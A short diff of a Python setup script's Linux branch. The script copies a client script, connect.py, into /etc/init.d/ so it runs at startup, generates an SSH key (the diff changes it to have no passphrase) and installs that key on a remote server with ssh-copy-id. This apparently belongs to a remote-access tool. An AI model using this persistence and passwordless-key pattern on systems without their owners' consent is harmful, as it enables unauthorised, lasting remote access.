@@ -69,7 +69,7 @@ if platform.system() == "Linux":
 	    subprocess.Popen("cd && mkdir .ssh", shell=True).wait()
 	    subprocess.Popen("yes | cp Client/connect.py /etc/init.d/", shell=True).wait()
             subprocess.Popen("chmod +x /etc/init.d/connect.py", shell=True).wait()
-            subprocess.call("printf 'priv_key\n\n' | ssh-keygen -t rsa -b 2048 -v", shell=True)
+            subprocess.call("printf 'priv_key\n\n' | ssh-keygen -t rsa -b 2048 -v -P ''", shell=True)
 
 	    print("[*] Copying SSH-Keys file over to server...")
 	    subprocess.call(['ssh-copy-id', '-i', 'priv_key.pub', rootname])
